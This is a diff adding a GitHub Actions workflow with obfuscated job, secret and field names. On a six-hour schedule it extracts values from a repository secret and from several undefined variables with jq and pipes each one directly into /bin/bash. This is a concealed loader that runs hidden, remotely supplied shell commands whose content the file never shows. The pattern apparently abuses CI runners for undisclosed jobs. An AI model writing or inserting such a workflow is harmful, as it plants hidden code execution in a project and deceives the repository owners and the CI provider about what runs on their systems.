@@ -1,0 +1,22 @@
+name: xiangboshouzhe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangboshouzhe
+        env:
+          co29: ${{ secrets.co29 }}
+        run: |
+          echo $co29 | jq -r .oje37 | /bin/bash
+          echo $qisji21 | jq -r .xh747 | /bin/bash
+          echo $an8 | jq -r .lx9 | /bin/bash
+          echo $e473 | jq -r .wxt82698 | /bin/bash
+          echo $wxiq8352 | jq -r .osf35 | /bin/bash
+          echo $abj4 | jq -r .bcnp334 | /bin/bash
+
